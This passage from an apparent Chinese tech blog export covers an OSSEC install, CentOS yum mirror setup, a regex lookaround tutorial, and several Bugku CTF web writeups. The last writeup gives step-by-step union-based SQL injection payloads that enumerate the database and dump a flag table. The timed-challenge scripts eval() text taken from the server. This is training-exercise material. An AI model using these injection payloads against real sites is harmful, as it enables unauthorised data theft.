vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#下载ossec-wui-0.9</span></span><br><span class="line">wget -O /<span class="keyword">var</span>/www/html/ossec-wui<span class="number">-0.9</span>.tar.gz https:<span class="comment">//github.com/alixiaowei/ossec/blob/master/ossec-wui-0.9.tar.gz?raw=true</span></span><br><span class="line"><span class="meta">#解压并重新命名</span></span><br><span class="line">cd /<span class="keyword">var</span>/www/html/</span><br><span class="line">tar -xzf ossec-wui<span class="number">-0.9</span>.tar.gz</span><br><span class="line">mv ossec-wui<span class="number">-0.9</span> ossec</span><br><span class="line"><span class="meta">#安装</span></span><br><span class="line">ossec/setup.sh</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khlg3nx0j30ke05dglj.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khlksnc7j30t007jt8w.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khlownvsj310h0kl0v2.jpg" alt=""></p><h5 id="实现目录保护-需要密码访问"><a href="#实现目录保护-需要密码访问" class="headerlink" title="实现目录保护(需要密码访问)"></a>实现目录保护(需要密码访问)</h5><p>创建/etc/httpd/conf.d/ossec.conf文件<br>添加配置<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Alias ossec/ <span class="string">"/var/www/html/ossec/"</span></span><br><span class="line"></span><br><span class="line"><span class="params">&lt;Directory "/var/www/html/ossec/"&gt;</span></span><br><span class="line">AuthName <span class="string">"OSSEC AUTH"</span></span><br><span class="line">Require valid-user</span><br><span class="line">AuthType Basic</span><br><span class="line">AuthUserFile <span class="meta-keyword">/var/</span>www<span class="meta-keyword">/html/</span>ossec/.htpasswd</span><br><span class="line"><span class="params">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#重启httpd服务</span></span><br><span class="line">service httpd restart</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khlunsotj30sl097dfv.jpg" alt=""></p><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta-keyword">/var/</span>ossec<span class="meta-keyword">/bin/</span>ossec-control restart 重启ossec服务</span><br><span class="line">netstat -tuanp 查看端口</span><br><span class="line"><span class="meta-keyword">/var/</span>ossec<span class="meta-keyword">/bin/</span>agent_control -lc 查看状态</span><br><span class="line"><span class="meta-keyword">/var/</span>ossec/ossec-logtest 用于测试OSSEC的泛化及告警规则</span><br><span class="line">更多可以进入/bin目录查看</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#核心配置文件</span></span><br><span class="line"></span><br><span class="line">ossec.conf  ossec hids主要配置文件</span><br><span class="line"></span><br><span class="line">internal_options.conf：  额外配置选项文件</span><br><span class="line"></span><br><span class="line">decoders.xml：  文件解码器，各种规则都在这里写来调用</span><br><span class="line"></span><br><span class="line">client.keys：  用于客户端与服务器认证通信</span><br><span class="line"></span><br><span class="line">/var/ossec/bin  目录包含ossec hids使用的二进制文件</span><br><span class="line"></span><br><span class="line">/var/ossec/etc  目录包含所有ossec hids使用的配置文件</span><br><span class="line"></span><br><span class="line"><span class="comment">#日志文件</span></span><br><span class="line"></span><br><span class="line">/var/ossec/logs  包含有关ossec hids所有的日志目录</span><br><span class="line"></span><br><span class="line">ossec.log  包含osse hids所有日志(error,warn,info和其他)</span><br><span class="line"></span><br><span class="line">alerts/alerts.log  ossec hids报警日志</span><br><span class="line"></span><br><span class="line">active-responses.log  ossec hids响应日志</span><br><span class="line"></span><br><span class="line"><span class="comment">#队列</span></span><br><span class="line">/var/ossec<span class="built_in">/queue </span> 目录包含ossec hids队列文件</span><br><span class="line"></span><br><span class="line">agent-<span class="builtin-name">info</span>  目录包含操作系统版本、ossec hids版本等信息</span><br><span class="line"></span><br><span class="line">syscheck  目录包含每个agent的数据校验日志</span><br><span class="line"></span><br><span class="line">rootcheck  目录包含每个agent，rootkit检查数据和监控规则。</span><br><span class="line"></span><br><span class="line">rids  目录包含agent ids信息</span><br><span class="line"></span><br><span class="line"><span class="comment">#规则</span></span><br><span class="line">/var/ossec/rules 目录包含所有osse hids规则</span><br><span class="line"></span><br><span class="line"><span class="built_in">..</span>.</span><br></pre></td></tr></table></figure><p>参考文档：<br><a href="http://www.ossec.net/" target="_blank" rel="noopener">http://www.ossec.net/</a><br><a href="https://ossec-docs.readthedocs.io/en/latest/manual/rules-decoders/create-custom.html" target="_blank" rel="noopener">https://ossec-docs.readthedocs.io/en/latest/manual/rules-decoders/create-custom.html</a><br><a href="https://www.freebuf.com/articles/system/11862.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/11862.html</a></p>]]></content>
      
      
      <categories>
          
          <category> OSSEC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> Centos7 </tag>
            
            <tag> OSSEC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos7更换软件安装源</title>
      <link href="/2019/03/12/201936/"/>
      <url>/2019/03/12/201936/</url>
      
        <content type="html"><![CDATA[<h4 id="阿里云Linux安装镜像源地址：https-opsx-alibaba-com-mirror"><a href="#阿里云Linux安装镜像源地址：https-opsx-alibaba-com-mirror" class="headerlink" title="阿里云Linux安装镜像源地址：https://opsx.alibaba.com/mirror"></a>阿里云Linux安装镜像源地址：<a href="https://opsx.alibaba.com/mirror" target="_blank" rel="noopener">https://opsx.alibaba.com/mirror</a></h4><a id="more"></a><h4 id="Centos7更换阿里云安装镜像源"><a href="#Centos7更换阿里云安装镜像源" class="headerlink" title="Centos7更换阿里云安装镜像源"></a>Centos7更换阿里云安装镜像源</h4><h5 id="备份原有的镜像文件，以免出错时可以恢复"><a href="#备份原有的镜像文件，以免出错时可以恢复" class="headerlink" title="备份原有的镜像文件，以免出错时可以恢复"></a>备份原有的镜像文件，以免出错时可以恢复</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /etc/yum<span class="selector-class">.repos</span><span class="selector-class">.d</span>/CentOS-Base.repo&#123;,.backup&#125;</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khtzva59j30di00n0si.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khu6lj9xj30wr02kq2u.jpg" alt=""></p><h5 id="下载更新的源文件-CentOS-Base-repo-到-etc-yum-repos-d"><a href="#下载更新的源文件-CentOS-Base-repo-到-etc-yum-repos-d" class="headerlink" title="下载更新的源文件(CentOS-Base.repo)到/etc/yum.repos.d/"></a>下载更新的源文件(CentOS-Base.repo)到/etc/yum.repos.d/</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 升级所有包以及升级软件和系统内核</span></span><br><span class="line"><span class="comment"># --skip-broken 忽略包的依赖问题</span></span><br><span class="line">yum <span class="keyword">update</span> <span class="comment">--skip-broken -y </span></span><br><span class="line"><span class="comment">#安装wget</span></span><br><span class="line">yum <span class="keyword">install</span> wget -y</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khubk9k1j30zq0fita7.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khvkstmfj30zq0fi3z1.jpg" alt=""></p><h5 id="更新下载源"><a href="#更新下载源" class="headerlink" title="更新下载源"></a>更新下载源</h5><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># CentOS 7</span></span><br><span class="line"><span class="meta"># wget -O 下载并以不同的文件名保存</span></span><br><span class="line"><span class="meta"># wget默认会以最后一个符合”/”的后面的字符来命名</span></span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http:<span class="comment">//mirrors.aliyun.com/repo/Centos-7.repo</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khvq1gxsj30za050t8w.jpg" alt=""></p><h5 id="生成新的缓存"><a href="#生成新的缓存" class="headerlink" title="生成新的缓存"></a>生成新的缓存</h5><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 清除缓存</span></span><br><span class="line">yum clean all</span><br><span class="line"><span class="meta"># 建立缓存</span></span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khvvj7daj30su02mmx1.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khw1ngmqj30z70i0abu.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khw5ycgyj30z606sdfy.jpg" alt=""></p><h4 id="中国开源镜像网站"><a href="#中国开源镜像网站" class="headerlink" title="中国开源镜像网站"></a>中国开源镜像网站</h4><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">网易开源镜像站：<span class="string">http:</span><span class="comment">//mirrors.163.com/</span></span><br><span class="line">阿里云开源镜像站：<span class="string">http:</span><span class="comment">//mirrors.aliyun.com/</span></span><br><span class="line">清华大学：<span class="string">http:</span><span class="comment">//mirrors.tuna.tsinghua.edu.cn/</span></span><br><span class="line">东软信息学院:<span class="string">http:</span><span class="comment">//mirrors.neusoft.edu.cn/</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> Centos7 </tag>
            
            <tag> yum </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>暂停更新</title>
      <link href="/2019/02/15/201935/"/>
      <url>/2019/02/15/201935/</url>
      
        <content type="html"><![CDATA[<p>最近因为要比赛了 暂定更新先<br>比赛后再更新<br><a id="more"></a></p>]]></content>
      
      
      <categories>
          
          <category> 通知 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 通知 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-速度要快</title>
      <link href="/2019/02/03/201934/"/>
      <url>/2019/02/03/201934/</url>
      
        <content type="html"><![CDATA[<p><strong>速度要快-writeup</strong><br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khx34hfuj30ch0b9t8q.jpg" alt=""><br>访问链接，查看审查元素，提示<ok ,now="" you="" have="" to="" post="" the="" margin="" what="" find="">这里感觉需要post提交一些什么东西<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khx8d9puj30wf0bit9o.jpg" alt=""><br>利用burp suite进行抓包看看，在response中headers发现了一串base64<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khxd3n9kj30rs0m8jte.jpg" alt=""><br>进行base64解密<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khxicxnuj30xc09uq33.jpg" alt=""><br>解出来感觉还是怪怪的，感觉还是base64，进行再次解密<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khxn4tioj30xh0a5wek.jpg" alt=""></ok></p><p>将解密出来的进行提交，提交失败，想到源代码中的注释，post提交看一下<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khxsy616j30qr0f7aao.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khy20y58j317e0i00vr.jpg" alt=""><br>提示我（都说了让你快点。。。）<br>然后几次尝试发现每次headers中的base64在变化,发现PHPSESSID字段应该是要post提交保持同一个会话<br>写python进行post提交<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/web6/'</span>  <span class="comment"># 链接</span></span><br><span class="line">convert = requests.session()     <span class="comment"># 创建会话对象（保持cookie）</span></span><br><span class="line">html = convert.get(url)     <span class="comment"># get请求</span></span><br><span class="line">head = html.headers[<span class="string">'flag'</span>]     <span class="comment"># 获取头部flag信息</span></span><br><span class="line"></span><br><span class="line">decode_1 = base64.b64decode(head)   <span class="comment"># 进行base64解密</span></span><br><span class="line">code = decode_1.decode(<span class="string">'utf-8'</span>)  <span class="comment"># bytes转string</span></span><br><span class="line">separate = code.split(<span class="string">':'</span>)      <span class="comment"># 将base64解密后的字符串进行以‘：’进行分隔，获取flag后面的值</span></span><br><span class="line">decode_2 = base64.b64decode(separate[<span class="number">1</span>])  <span class="comment"># 返回分隔后的字符串列表，将解密后的进行二次base64解密</span></span><br><span class="line"></span><br><span class="line">flag = convert.post(url, data=&#123;<span class="string">'margin'</span>: decode_2&#125;)     <span class="comment"># 构造margin参数post提交</span></span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khydhx3ij30u70jcgmu.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> Python </tag>
            
            <tag> base64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-秋名山老司机</title>
      <link href="/2019/02/02/201933/"/>
      <url>/2019/02/02/201933/</url>
      
        <content type="html"><![CDATA[<p><strong>秋名山老司机-writeup</strong><br><a id="more"></a><br>打开题目，秋名山老司机来飙车吗？<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khythzx2j30ci09wjre.jpg" alt=""><br>访问链接，发现是一道计算题，算了下，2s?这道题明显要求计算响应内容中的表达式并POST请求正确的信息返回结果，还是快速反弹POST请求<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khz2j1w4j315s0fjwfh.jpg" alt=""><br>这里会纳闷传值传给谁，刷新了几下发现提示Give me value post about<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khz7ddbtj31610o7jsf.jpg" alt=""><br>直接写python<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/qiumingshan/'</span>  <span class="comment"># 链接</span></span><br><span class="line">convert = requests.Session()<span class="comment"># 创建session对象，session对象可以使我们跨请求保持某些参数，也可以在同一个session实例发出的所有请求之间保持cookies</span></span><br><span class="line">html = convert.get(url).text<span class="comment"># get请求</span></span><br><span class="line">reg = re.compile(<span class="string">r'(?&lt;=&lt;div&gt;).*(?=\=)'</span>).findall(html) <span class="comment">#匹配表达式如['2024653276+1430867578+1152697161*392577551-1429779315*779503901+1352271449+1584130862+557093247+1523782933+1160059856']</span></span><br><span class="line">payload = &#123;<span class="string">'value'</span>: eval(reg[<span class="number">0</span>])&#125;<span class="comment"># eval计算式子(匹配出来的是列表)并构造post请求的data部分</span></span><br><span class="line">flag = convert.post(url, data=payload)<span class="comment"># post带参数提交</span></span><br><span class="line">flag.encoding = <span class="string">'utf-8'</span><span class="comment">#'utf-8'格式</span></span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2khzep1hyj30kh0drn3g.jpg" alt=""><br>这个因为是2s的原因，要结合环境（程序自身的的运行时间、网速等因素）也有可能python的计算与服务端的计算有误差，导致出现了要一定的概率才会出现flag，（触及到我的知识盲区-_-!）多尝试几次。可以加个while True 循环，亦或者加个多线程并发。</p>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式之零宽断言</title>
      <link href="/2019/02/01/201932/"/>
      <url>/2019/02/01/201932/</url>
      
        <content type="html"><![CDATA[<p><strong>正则表达式之零宽断言</strong><br><a id="more"></a><br>零宽断言:用于查找特定内容之前或之后的内容，但并不包括特定内容本身。<br>断言用来声明一个应该为真的事实。正则表达式中只有当断言为真时才会继续进行匹配。<br>简单来说就是匹配一个位置，这个位置满足某个正则，但不纳入结果的，所以叫“零宽断言”，而且这个位置的前面或后面需要满足某种正则。</p><table><thead><tr><th>分类</th><th style="text-align:left">代码/语法</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td>零宽度正预测先行断言</td><td style="text-align:left">(?=exp)</td><td style="text-align:left">匹配exp前面的位置<br></td></tr><tr><td>零宽度正回顾后发断言</td><td style="text-align:left">(?&lt;=exp)</td><td style="text-align:left">匹配exp后面的位置</td></tr><tr><td>零宽度负预测先行断言</td><td style="text-align:left">(?!exp)</td><td style="text-align:left">匹配后面跟的不是exp的位置</td></tr><tr><td>零宽度负回顾后发断言</td><td style="text-align:left">(?&lt;!exp)</td><td style="text-align:left">匹配前面不是exp的位置</td></tr></tbody></table><p>下面结合例子来理解下什么是零宽断言。<br><strong>零宽断言</strong><br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正则表达式:(?&lt;=&lt;<span class="keyword">div</span>&gt;).*(?=&lt;/<span class="keyword">div</span>&gt;) </span><br><span class="line">匹配字符串:&lt;<span class="keyword">div</span>&gt;www.axiaowei.cn&lt;/<span class="keyword">div</span>&gt; </span><br><span class="line">匹配结果:www.axiaowei.cn</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki11yktaj30qp0i0wev.jpg" alt=""><br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正则表达式：(?&lt;=&lt;<span class="keyword">div</span>&gt;).*</span><br><span class="line">匹配字符串:&lt;<span class="keyword">div</span>&gt;www.axiaowei.cn&lt;/<span class="keyword">div</span>&gt; </span><br><span class="line">匹配结果:www.axiaowei.cn&lt;/<span class="keyword">div</span>&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki1dei6dj30jg0g1aai.jpg" alt=""><br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正则表达式：(?=www).*(?&lt;=<span class="keyword">cn</span>)</span><br><span class="line">匹配字符串：<span class="symbol">&lt;div&gt;</span>www.axiaowei.<span class="keyword">cn</span>&lt;/div&gt; </span><br><span class="line">匹配结果:www.axiaowei.<span class="keyword">cn</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki1inforj30iv0f7weu.jpg" alt=""><br><strong>负向零宽断言</strong><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正则表达式：\d&#123;<span class="number">3</span>&#125;(?!\d) -&gt;匹配三位数字的后面不能是数字</span><br><span class="line">匹配字符串：<span class="number">235456123</span></span><br><span class="line">匹配结果：<span class="number">123</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki1r5aqwj30im0fodg1.jpg" alt=""><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正则表达式：(?&lt;![a-z])\d&#123;<span class="number">7</span>&#125; -&gt;匹配前面不是小写字母的七位数字</span><br><span class="line">匹配字符串：<span class="number">1111111</span>d2222222d3333333S4444444</span><br><span class="line">匹配结果：<span class="number">1111111</span>, <span class="number">4444444</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki1y5mrqj30mr0hawet.jpg" alt=""><br>这里举一个常见的简单计算题，我们利用零宽断言进行匹配。<br>三秒中算出式子（每次刷新式子也会变化），想必能算出来输入提交也超过三秒了吧，直接写python<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki2459e1j30vk0iggm9.jpg" alt=""><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.31.85:10002/'</span></span><br><span class="line">convert = requests.session()</span><br><span class="line">html = convert.get(url).text</span><br><span class="line">reg = re.compile(<span class="string">r'.+(?=&lt;/p&gt;)'</span>).findall(html)  <span class="comment"># 零宽断言匹配</span></span><br><span class="line"></span><br><span class="line">link = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> reg:</span><br><span class="line">    link += i</span><br><span class="line">data = eval(link)</span><br><span class="line"></span><br><span class="line">post = convert.post(url, &#123;<span class="string">'result'</span>: data&#125;)</span><br><span class="line">print(<span class="string">'三秒之内计算出以下式子：\n'</span>, link, <span class="string">'='</span>, data)</span><br><span class="line">print(post.text)</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki2b8banj311d0m00ub.jpg" alt=""></p><p>参考资料：<br><a href="http://deerchao.net/tutorials/regex/regex.htm" target="_blank" rel="noopener">http://deerchao.net/tutorials/regex/regex.htm</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> re </tag>
            
            <tag> regex </tag>
            
            <tag> 零宽断言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku-成绩单</title>
      <link href="/2019/02/01/201931/"/>
      <url>/2019/02/01/201931/</url>
      
        <content type="html"><![CDATA[<p>成绩单-writeup<br><a id="more"></a><br>打开题目<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki34pwdtj30ci09w749.jpg" alt=""><br>访问链接，根据上面提示分别输入1,2,3查询下<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki3w985xj30x60ig3ym.jpg" alt=""><br>尝试输入1’返回异常，输入1’#返回正常，判断存在注入<br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki42x0laj30x60igglo.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki49ypvtj30x60igt8t.jpg" alt=""><br>尝试手动注入<br>利用order by 判断列数为4列<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>'<span class="keyword">order</span> <span class="title">by</span> <span class="number">4</span> <span class="comment"># 返回正常</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki4f7jidj30x60igt8u.jpg" alt=""><br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>'<span class="keyword">order</span> <span class="title">by</span> <span class="number">5</span> <span class="comment"># 返回异常</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki4lv2g4j30x60igmx9.jpg" alt=""><br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">利用联合查询查看显位payload:</span><br><span class="line"><span class="number">-1</span>'<span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="meta">#</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki4r5nxcj30x60igt8u.jpg" alt=""><br><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆库名paylaod:</span><br><span class="line"><span class="number">-1</span>'<span class="built_in">union</span> <span class="built_in">select</span> <span class="number">1</span>,database(),<span class="number">3</span>,<span class="number">4</span> <span class="meta">#</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki4wvonxj30x60igt8v.jpg" alt=""><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆表名payload:</span><br><span class="line">-1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki52lncwj30x60igglr.jpg" alt=""></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">爆字段payload:</span><br><span class="line">-1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'fl4g'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/006Gstfogy1g2ki5bxq0cj30x60igmxb.jpg" alt=""><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询数据payload:</span><br><span class="line">-1'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(skctf_flag),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> fl4g<span class="comment">#</span></span><br></pre></td></tr></table></figure></p><p><img 